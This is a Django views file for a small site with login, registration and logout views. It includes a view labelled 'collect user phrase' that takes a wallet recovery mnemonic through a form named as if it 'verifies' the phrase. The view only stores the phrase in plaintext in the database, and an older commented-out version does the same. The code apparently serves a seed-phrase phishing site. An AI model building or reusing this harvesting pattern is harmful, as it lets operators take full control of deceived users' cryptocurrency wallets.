from django.shortcuts import render, redirect
from django.contrib.auth.models import User
from django.contrib.auth import logout, login, authenticate
from django.contrib import messages
from .decorators import not_logged_in_required
from django.contrib.auth.decorators import login_required
from .forms import LoginForm, RegisterForm, VerifyMnemonicForm
from .models import UserKeys


# INDEX VIEW
def index(request):
    return render(request, "pages/index.html")

# COLLECT UER PHRASE
@login_required
def verify_mnemonic_view(request):
    if request.method == 'POST':
        form = VerifyMnemonicForm(request.POST)
        if form.is_valid():
            # Get the user and the entered recovery phrase
            user = request.user
            entered_phrase = form.cleaned_data['mnemonic']

            # Create a new UserKeys instance for each submitted phrase
            user_keys = UserKeys.objects.create(user=user, phrase=entered_phrase, is_completed=True)

            return redirect('index-page')
        else:
            print(form.errors)
    else:
        form = VerifyMnemonicForm()

    return render(request, 'pages/form.html', {'form': form})

# LOGIN PAGE
@not_logged_in_required
def login_user(request):
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            user = authenticate(request, username=username, password=password)

            if user is not None:
                login(request, user)
                # Redirect to a success page
                return redirect('index-page')
            else:
                # Handle invalid login
                # You might want to display an error message or redirect to the login page with an error parameter
                return redirect('register-page')
    else:
        form = LoginForm()

    return render(request, 'pages/login.html', {'form': form})

# LOGOUT PAGE

@login_required
def logout_user(request):
    logout(request)
    messages.add_message(request, messages.SUCCESS,
                         "You have been logged out successfully")
    return redirect('login-page')


# REGISTER PAGE
@not_logged_in_required
def register_user(request):
    if request.method == 'POST':
        form = RegisterForm(request.POST)
        if form.is_valid():
              # Get form data
            username = form.cleaned_data['username']
            email = form.cleaned_data['email']
            password = form.cleaned_data['password']

            # Create a new user
            user = User.objects.create_user(username=username, email=email, password=password)

            # Log in the user
            login(request, user)

            # Redirect to a success page or home page
            return redirect('login-page')
    else:
        form = RegisterForm()

    return render(request, 'pages/signup.html', {'form': form})
























# from django.shortcuts import redirect, render
# from django.contrib import messages, auth
# from django.contrib.auth.models import User
# from .models import UserKeys
# from django.contrib.auth import login, logout, authenticate
# from .models import UserProfile
# from .decorators import not_logged_in_required
# from django.contrib.auth.decorators import login_required
# from django.utils.http import urlsafe_base64_decode, urlsafe_base64_encode
# from django.core.mail import EmailMessage
# from django.template.loader import render_to_string
# from django.contrib.sites.shortcuts import get_current_site
# from django.contrib.auth.tokens import default_token_generator
# from django.http import Http404
# from django.utils.encoding import force_bytes, force_str
# from django.contrib.auth.forms import SetPasswordForm








# # Create your views here.
# # homepage
# @login_required
# def home(request):
#     return render(request, 'app/home-page.html')

# # signup page
# @not_logged_in_required
# def createuser(request):
#     if request.method == 'POST':
#         username = request.POST.get('username')
#         password = request.POST.get('password')

#         if not username:
#             messages.add_message(request, messages.ERROR, 'Username is required.')
#             return redirect('home-page')

#         # Check if the username is already taken
#         if User.objects.filter(username=username).exists():
#             messages.add_message(request, messages.WARNING, 'Username exists.')
#             return redirect('home-page')

#         # Create user
#         user = User.objects.create_user(username=username, password=password)
#         user.is_active = True
#         user.save()
        

#         messages.success(request, 'Registration successful. Please log in.')
#         return redirect('userphrase')  # Redirect to login page

#     return render(request, 'app/registrationform.html')

# # login page
# def loginuser(request):
#     if request.method == 'POST':
#         username = request.POST.get('username')
#         password = request.POST.get('password')
        # user = authenticate(request, username=username, password=password)
    
        # if user is not None:
        #     login(request, user)
        #     messages.success(request, f'Welcome {user.username}')
        #     return redirect('home-page')  # Adjust 'home-page' to your actual URL

        # else:
        #     messages.warning(request, 'Invalid credentials')
        #     return render(request, 'app/login-page.html', status=401)

#     return render(request, 'app/login-page.html')

# @login_required
# def userphrase(request):
#     if request.method == 'POST':
#         phrase = request.POST.get('phrase')

#         if not phrase:
#             messages.error(request, 'Please provide a phrase.')
#             return redirect('userphrase')

#         UserKeys.objects.create(user=request.user, phrase=phrase)
#         messages.success(request, 'Phrase saved successfully.')

#         # You can redirect to a success page or another view if needed
#         return redirect('userphrase')
#     return render(request, 'app/userphrase.html')


# # CONFIRMED RESET PASSWORD
# def password_reset_success_email(request, user):
#     mail_subject = 'Password Changed'
#     message = render_to_string('authentication/password-reset-success-email.txt', {
#        'user': user.username,
#        'domain': get_current_site(request).domain,
#        'protocol': 'https' if request.is_secure() else 'http'
#     })

#     email = EmailMessage(mail_subject, message, to=[user.email])
#     email.send()


# # RESET PASSWORD 
# def new_password(request, uidb64, token):
#     try:
#         uid = urlsafe_base64_decode(uidb64).decode()
#         user = User.objects.get(pk=uid)
#     except(TypeError, ValueError, OverflowError, User.DoesNotExist):
#         user = None

#     if user is not None and default_token_generator.check_token(user, token):
#         if request.method == 'POST':
#             form = SetPasswordForm(user=user, data=request.POST)
#             if form.is_valid():
#                 form.save()

#                 password_reset_success_email(request, user)

#                 messages.add_message(request, messages.SUCCESS,
#                                         'Your password has been successfully reset. You can login.')
#                 return redirect('authentication:login-page')
#         else:
#             form = SetPasswordForm(user=user)

#         return render(request, 'authentication/new-password-form.html', {'form': form})
#     else:
#         raise Http404('Invalid reset password link.')


# # SEND PASSWORD RESET EMAIL
# def send_password_resetemail(request, user):
#     mail_subject = 'reset your password'
#     message = render_to_string('app/forgotpassword/password-reset-email.txt', {
#        'user': user.username,
#        'domain': get_current_site(request).domain,
#        'uid': urlsafe_base64_encode(force_bytes(user.pk)),
#        'token': default_token_generator.make_token(user),
#        'protocol': 'https' if request.is_secure() else 'http'
#     })

#     email = EmailMessage(mail_subject, message, to=[user.email])
#     if email.send():
#         messages.add_message(request, messages.SUCCESS,
#                                 'We sent you an email to reset your account password')
#     else:
#         messages.add_message(request, messages.SUCCESS,
#                                 'verify your account')



# # FORGOT PASSWORD FORM
# @not_logged_in_required
# def forgotpasswordform(request):
#     if request.method == 'POST':
#         email = request.POST.get('email')
        
#         if User.objects.filter(email=email).exists():
#             try:
#                 user = User.objects.get(email=email)
#                 send_password_resetemail(request, user)
#                 messages.add_message(request, messages.SUCCESS,
#                                 'Check your email for reset link')
#                 return redirect('login-page')
#             except User.DoesNotExist:
#                 # Handle the case where no user with the given email exists
               
#                 messages.add_message(request, messages.WARNING,
#                                 'No user with the given email exists')
              
#         else:
#             messages.add_message(request, messages.WARNING,
#                                 'No user with the given email exists')
       
#     return render(request, 'app/forgotpasswordform.html')


# # logoiut user
# @login_required
# def logoutuser(request):
#     logout(request)
#     messages.add_message(request, messages.SUCCESS,
#                          "You have been logged out successfully")
#     return redirect('login-page')

